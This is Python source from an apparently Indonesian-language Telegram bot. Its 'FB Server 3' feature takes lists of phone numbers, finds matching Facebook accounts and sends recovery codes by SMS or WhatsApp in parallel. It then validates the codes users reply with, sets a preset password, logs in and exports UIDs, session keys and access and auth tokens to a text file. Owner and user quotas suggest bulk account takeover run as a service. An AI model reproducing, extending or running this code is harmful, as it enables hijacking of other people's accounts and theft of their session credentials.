async def _fb_s3_start(query, context, user_id: int):
    """Start Server 3 — parallel code send, then wait for codes."""
    if not FB_S3_OK:
        await query.message.edit_text(
            _screen('FB SERVER 3', f"{EMOJI['FAILED']} fb_server3 module not available."),
            parse_mode=ParseMode.HTML)
        return

    if _fb_s3_active.get(user_id):
        await query.message.edit_text(
            _screen('FB SERVER 3', f"{em(E2,'⚠️')} Server 3 masih aktif! Tunggu selesai."),
            parse_mode=ParseMode.HTML)
        return

    phones = context.user_data.get(f"fb_phones_{user_id}", [])
    if not phones:
        await query.message.edit_text(
            _screen('FB SERVER 3', f"{EMOJI['FAILED']} Data nomor tidak ditemukan."),
            parse_mode=ParseMode.HTML)
        return

    is_owner = (user_id == USER_ID)
    is_adduser = user_id in _get_all_addusers() if not is_owner else False
    if is_owner:
        limit = len(phones)
    elif is_adduser:
        limit = FB_S3_ADDUSER_LIMIT
    else:
        limit = FB_S3_USER_LIMIT
    if len(phones) > limit:
        phones = phones[:limit]

    method = context.user_data.get(f"fb_s3_method_{user_id}", "sms")
    method_label = "WhatsApp" if method == "whatsapp" else "SMS"
    method_icon = em(CE_WHATSAPP, '💬') if method == "whatsapp" else em(CE_NOMOR, '📱')

    _fb_s3_active[user_id] = True
    msg = query.message

    await msg.edit_text(
        f"<blockquote>"
        f"{em(E1,'🔑')} <b>FB SERVER 3 — RECOVERY</b>\n"
        f"────────────────────────────\n\n"
        f"  {em(CE_NOMOR,'📞')} <b>Target:</b> {len(phones)} nomor\n"
        f"  {em(E6,'🚀')} <b>Workers:</b> {FB_S3_WORKERS}\n"
        f"  {em(CE_LOGIN,'🔐')} <b>Password:</b> <code>{_get_fb_password(context, user_id)}</code>\n"
        f"  {method_icon} <b>Metode:</b> {method_label}\n\n"
        f"{em(CE_LOADING,'🔄')} <i>Mengirim kode ke semua nomor via {method_label}...</i>"
        f"</blockquote>",
        parse_mode=ParseMode.HTML)

    # Parallel: search + send code for all
    loop = asyncio.get_event_loop()
    results = {}
    lock = threading.Lock()
    done_count = [0]
    send_method = method

    def _process_one(phone):
        try:
            import time as _t
            t0 = _t.time()
            sr, ident, sess = s3_search_retry(
                phone, use_proxy=False, force_real_sms=(send_method == "sms"))
            t1 = _t.time()
            if not sr.found or not sr.accounts:
                if sr.rate_limited or _is_rate_limited(sr.error):
                    print(f"[S3] {phone}: search={t1-t0:.1f}s → rate_limited")
                    return phone, {"status": "rate_limited", "total": sr.total_count,
                                  "error": sr.error or "FB rate limit (368)"}
                err_low = (sr.error or "").lower()
                if err_low and ("ssl" in err_low or "connection" in err_low or "max retries" in err_low):
                    print(f"[S3] {phone}: search={t1-t0:.1f}s → network_error ({sr.error[:80]})")
                    return phone, {"status": "network_error", "total": sr.total_count,
                                  "error": sr.error}
                if sr.error:
                    print(f"[S3] {phone}: search={t1-t0:.1f}s → not_found ({sr.error})")
                else:
                    print(f"[S3] {phone}: search={t1-t0:.1f}s → not_found")
                return phone, {"status": "not_found", "total": sr.total_count,
                              "error": sr.error or ""}
            targets = [acc for acc in sr.accounts if acc.phone_cp_id]
            if not targets:
                print(f"[S3] {phone}: search={t1-t0:.1f}s → no_phone_cp")
                return phone, {"status": "no_phone_cp"}
            sms_ok = []
            sms_fail = []
            for target in targets:
                _t.sleep(random.uniform(0.5, 1.2))
                sms = s3_send_sms_retry(target.cuid, target.phone_cp_id,
                                        method=send_method,
                                        session=sess, identity=ident, use_proxy=False)
                if sms.success:
                    sms_ok.append({"cuid": target.cuid, "name": target.name,
                                   "cp_id": target.phone_cp_id,
                                   "code_length": sms.code_length,
                                   "channel": sms.channel or "sms",
                                   "wa_first": target.wa_first,
                                   "validated": False})
                else:
                    label = target.name or target.cuid[:20]
                    detail = sms.error or f"code_len={sms.code_length} ch={sms.channel}"
                    if target.wa_first and send_method == "sms":
                        detail = f"wa_first · {detail}"
                    sms_fail.append(f"{label}: {detail}")
            t2 = _t.time()
            ml = "WA" if send_method == "whatsapp" else "SMS"
            ch_note = ""
            if send_method == "sms" and sms_fail:
                ch_note = f" | fail: {', '.join(sms_fail[:2])}"
            print(f"[S3] {phone}: search={t1-t0:.1f}s {ml}={t2-t1:.1f}s "
                  f"→ {len(sms_ok)}/{len(targets)} ok{ch_note}")
            if sms_ok:
                return phone, {"status": "sms_sent", "accounts": sms_ok,
                              "identity": ident,
                              "session": sess,
                              "total_found": sr.total_count,
                              "sms_failed": sms_fail}
            else:
                return phone, {"status": "sms_failed",
                              "error": f"Gagal kirim ke semua {len(targets)} akun"}
        except Exception as e:
            return phone, {"status": "error", "error": str(e)}

    def _run_all():
        import time as _t
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=min(FB_S3_WORKERS, len(phones))) as pool:
            futs = []
            for i, p in enumerate(phones):
                if i > 0:
                    _t.sleep(FB_S3_SUBMIT_STAGGER)
                futs.append(pool.submit(_process_one, p))
            for f in futs:
                phone, res = f.result()
                with lock:
                    results[phone] = res
                    done_count[0] += 1

    await loop.run_in_executor(None, _run_all)

    # Categorize results
    sms_sent = {p: r for p, r in results.items() if r["status"] == "sms_sent"}
    failed = {p: r for p, r in results.items() if r["status"] != "sms_sent"}

    # Store for code validation later
    _fb_s3_data[user_id] = sms_sent

    if not sms_sent:
        _fb_s3_active[user_id] = False
        body = (
            f"<blockquote>"
            f"{EMOJI['FAILED']} <b>Tidak ada kode terkirim!</b>\n"
            f"────────────────────────────\n\n"
            f"  {method_icon} <b>Metode:</b> {method_label}\n\n"
        )
        show_failed = list(failed.items())[:20]
        for p, r in show_failed:
            body += f"  {em(E2,'❌')} +{p} — {r.get('error', r['status'])}\n"
        if len(failed) > 20:
            body += f"\n  <i>... +{len(failed) - 20} lainnya</i>\n"
        body += f"</blockquote>"
        await msg.edit_text(body, parse_mode=ParseMode.HTML)
        return

    total_accounts = sum(len(r.get("accounts", [])) for r in sms_sent.values())
    body = (
        f"<blockquote>"
        f"{em(E1,'🔑')} <b>KODE TERKIRIM!</b>\n"
        f"────────────────────────────\n\n"
        f"  {method_icon} <b>Metode:</b> {method_label}\n"
        f"  {em(E1,'✅')} <b>Nomor:</b> {len(sms_sent)} | <b>Akun:</b> {total_accounts}\n"
        f"  {em(E2,'❌')} <b>Gagal:</b> {len(failed)}\n\n"
        f"<b>Akun yang menunggu kode:</b>\n"
    )
    idx = 0
    for p, r in list(sms_sent.items())[:30]:
        accts = r.get("accounts", [])
        tf = r.get("total_found", len(accts))
        for j, acc in enumerate(accts):
            idx += 1
            name = acc.get("name", "?")
            cl = acc.get("code_length", "?")
            ch = acc.get("channel", "sms")
            wa = " ⚠️wa_first" if acc.get("wa_first") else ""
            body += f"  {idx}. <code>+{p}</code> — {name} ({cl} digit, {ch}){wa}\n"
        if tf > len(accts):
            body += f"     <i>({tf - len(accts)} akun lain tersembunyi)</i>\n"
    if len(sms_sent) > 30:
        body += f"  <i>... +{len(sms_sent) - 30} nomor lainnya</i>\n"

    body += (
        f"\n────────────────────────────\n"
        f"<b>Reply dengan format:</b>\n"
        f"<code>nomor:kode</code>\n\n"
        f"<b>Contoh:</b>\n"
        f"<code>6013:123456</code>  <i>(3-4 digit akhir, kode 6-8 digit)</i>\n"
        f"<code>6285825306013:12345678</code>\n\n"
        f"<i>Kode SMS Facebook biasanya 6-8 digit.</i>\n"
        f"<i>Kode dicoba ke semua akun di nomor itu.</i>\n"
        f"<i>Kirim banyak sekaligus (1 per baris).</i>"
        f"</blockquote>"
    )

    # Store message ID for reply detection
    code_msg = await msg.edit_text(
        _screen('FB SERVER 3', body, 'Home › Facebook › Server 3 › Waiting'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("Batal", callback_data=f"fb_s3_cancel_{user_id}",
                                 style="danger"),
        ]]))
    context.user_data[f"fb_s3_waiting_{user_id}"] = code_msg.message_id
    context.user_data[f"fb_s3_code_{user_id}"] = None


async def _fb_s3_validate_codes(context, user_id: int, chat_id: int, codes_text: str):
    """Validate codes submitted by user. Format: phone:code per line."""
    sms_data = _fb_s3_data.get(user_id, {})
    if not sms_data:
        return

    bot = context.bot
    lines = [l.strip() for l in codes_text.strip().splitlines() if ':' in l]
    if not lines:
        return

    normalized_map = {}
    for k in sms_data:
        nk = k.replace('+', '').replace('-', '').replace(' ', '')
        normalized_map[nk] = k

    def _match_phone(input_phone):
        """Match full number or 3-4 digit suffix."""
        exact = normalized_map.get(input_phone)
        if exact:
            return exact
        if len(input_phone) >= 3:
            for nk, orig in normalized_map.items():
                if nk.endswith(input_phone):
                    return orig
        return None

    pairs = []
    for line in lines:
        parts = line.split(':', 1)
        if len(parts) != 2:
            continue
        phone = parts[0].strip().replace('+', '').replace('-', '').replace(' ', '')
        code = parts[1].strip()
        orig_key = _match_phone(phone)
        if orig_key and len(code) >= 6:
            pairs.append((orig_key, code))

    if not pairs:
        await bot.send_message(chat_id=chat_id,
            text=f"{EMOJI['FAILED']} Nomor tidak cocok.\nPakai: <code>nomor:kode</code> atau <code>3-4 digit akhir:kode</code>",
            parse_mode=ParseMode.HTML)
        return

    # Process validations
    progress = await bot.send_message(chat_id=chat_id,
        text=_screen('FB SERVER 3', (
            f"{em(CE_LOADING,'🔄')} <b>Memvalidasi {len(pairs)} kode...</b>"
        ), 'Home › Facebook › Server 3 › Validating'),
        parse_mode=ParseMode.HTML)

    loop = asyncio.get_event_loop()
    results = []
    user_pw = _get_fb_password(context, user_id)

    def _validate_one(phone, code):
        data = sms_data[phone]
        ident = data.get("identity")
        sess = data.get("session")
        accounts = data.get("accounts", [])
        last_err = "Kode tidak cocok"
        for acc in accounts:
            if acc.get("validated"):
                continue
            val = s3_validate(acc["cuid"], code, f"+{phone}", password=user_pw,
                              session=sess, identity=ident, use_proxy=False)
            if val.success and val.uid:
                acc["validated"] = True
                login_res = s3_login(val.uid, password=user_pw,
                                     session=sess, identity=ident, use_proxy=False)
                return {"phone": phone, "status": "success", "uid": val.uid,
                        "name": acc.get("name", ""),
                        "contact": val.contact, "login": login_res.result,
                        "token": login_res.access_token[:50] if login_res.access_token else "",
                        "session": login_res.session_key,
                        "auth": login_res.auth_token[:50] if login_res.auth_token else ""}
            else:
                last_err = val.error or val.raw[:100] or "Kode salah"
        return {"phone": phone, "status": "failed", "error": last_err}

    def _run_validate():
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=FB_S3_WORKERS) as pool:
            futs = [pool.submit(_validate_one, p, c) for p, c in pairs]
            for f in futs:
                results.append(f.result())

    await loop.run_in_executor(None, _run_validate)

    for r in results:
        if r["status"] == "success":
            pdata = sms_data.get(r["phone"])
            if pdata:
                all_done = all(a.get("validated") for a in pdata.get("accounts", []))
                if all_done:
                    sms_data.pop(r["phone"], None)

    if not sms_data:
        _fb_s3_active[user_id] = False
        context.user_data.pop(f"fb_s3_waiting_{user_id}", None)
        context.user_data.pop(f"fb_s3_code_{user_id}", None)
        context.user_data.pop(f"fb_s3_method_{user_id}", None)
        _fb_s3_data.pop(user_id, None)

    # Build results
    success = [r for r in results if r["status"] == "success"]
    failed_v = [r for r in results if r["status"] != "success"]

    # Summary message
    summary = (
        f"{em(E1,'🔑')} <b>HASIL VALIDASI</b>\n"
        f"────────────────────────────\n\n"
        f"  ✅ <b>Berhasil:</b> {len(success)}\n"
        f"  ❌ <b>Gagal:</b> {len(failed_v)}\n"
    )
    if success:
        summary += f"\n"
        for r in success:
            icon = "✅" if r["login"] == "SUCCESS" else "⚠️"
            name = r.get("name", "")
            name_s = f" ({name})" if name and name != f"+{r['phone']}" else ""
            summary += f"  {icon} +{r['phone']}{name_s}\n"
            summary += f"     UID: <code>{r['uid']}</code>\n"
            summary += f"     Login: <b>{r['login']}</b>\n"
    if failed_v:
        summary += f"\n"
        for r in failed_v:
            summary += f"  ❌ +{r['phone']} — {r['error']}\n"

    if sms_data:
        remaining_count = sum(
            len([a for a in d.get("accounts", []) if not a.get("validated")])
            for d in sms_data.values()
        )
        summary += f"\n────────────────────────────\n"
        summary += f"<b>Masih menunggu kode ({remaining_count} akun):</b>\n"
        for p, d in sms_data.items():
            for acc in d.get("accounts", []):
                if not acc.get("validated"):
                    name = acc.get("name", "?")
                    summary += f"  • <code>+{p}</code> — {name}\n"
        summary += f"\n<i>Reply lagi dengan format nomor:kode</i>"

    try:
        await progress.edit_text(
            _screen('FB SERVER 3', summary, 'Home › Facebook › Server 3 › Results'),
            parse_mode=ParseMode.HTML)
    except:
        pass

    # Send .txt file if success
    if success:
        file_lines = []
        file_lines.append(f"{'═'*50}")
        file_lines.append(f"  🔑 FB SERVER 3 RESULTS")
        file_lines.append(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        file_lines.append(f"  Password: {_get_fb_password(context, user_id)}")
        file_lines.append(f"{'═'*50}\n")
        for r in success:
            file_lines.append(f"  📞 Phone   : +{r['phone']}")
            if r.get("name"):
                file_lines.append(f"  👤 Name    : {r['name']}")
            file_lines.append(f"  🆔 UID     : {r['uid']}")
            file_lines.append(f"  📱 Contact : {r.get('contact', '-')}")
            file_lines.append(f"  🔐 Pass    : {_get_fb_password(context, user_id)}")
            file_lines.append(f"  🎯 Login   : {r['login']}")
            if r.get("session"):
                file_lines.append(f"  🔑 Session : {r['session']}")
            if r.get("token"):
                file_lines.append(f"  🎫 Token   : {r['token']}...")
            if r.get("auth"):
                file_lines.append(f"  🛡 Auth    : {r['auth']}...")
            file_lines.append("")
        from io import BytesIO
        bio = BytesIO("\n".join(file_lines).encode('utf-8'))
        fname = f"fb_s3_{datetime.now().strftime('%H%M%S')}.txt"
        bio.name = fname
        await bot.send_document(chat_id=chat_id, document=bio, filename=fname,
            caption=f"{em(E1,'🔑')} Server 3 | ✅ {len(success)} berhasil",
            parse_mode=ParseMode.HTML)


def _get_all_addusers():
    """Get set of all adduser IDs from database."""
    try:
        cur.execute("SELECT user_id FROM allowed_users")
        return {row[0] for row in cur.fetchall()}
    except:
        return set()


async def telegram_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and handle specific network/timeout issues gracefully."""
    import httpx
    import telegram
    error = context.error
    # BadRequest & Forbidden turunan NetworkError di PTB, tapi itu BUG APLIKASI
    # (mis. "Message to be replied not found"), bukan gangguan jaringan. Kalau
    # ikut ditelan jadi [NETWORK WARNING], bug-nya tidak kelihatan di log.
    if isinstance(error, (telegram.error.BadRequest, telegram.error.Forbidden)):
        logger.error(msg="Exception while handling an update:", exc_info=error)
        return
    if isinstance(error, (telegram.error.TimedOut, telegram.error.NetworkError, httpx.ConnectTimeout, httpx.TimeoutException)):
        print(f"[NETWORK WARNING] Telegram API Connection Timeout/Error: {error}")
        return
    logger.error(msg="Exception while handling an update:", exc_info=context.error)


